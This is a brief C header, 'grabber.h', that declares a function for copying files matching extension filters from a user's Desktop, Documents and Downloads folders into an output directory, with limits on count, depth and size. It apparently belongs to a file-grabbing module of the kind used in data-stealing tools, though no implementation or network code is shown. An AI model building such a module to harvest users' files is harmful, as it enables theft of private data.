#ifndef GRABBER_H
#define GRABBER_H

#include <stddef.h>

#define GRABBER_MAX_PATH    512
#define GRABBER_MAX_FILES   4096
#define GRABBER_MAX_DEPTH   5
#define GRABBER_MAX_SIZE    (10 * 1024 * 1024)  /* 10 MB */

/* Collect files matching extension filters from Desktop/Documents/Downloads.
   Copies found files into output_dir. Returns number of files collected, or -1 on error. */
int grabber_collect(const char *output_dir, size_t max_files);

#endif /* GRABBER_H */
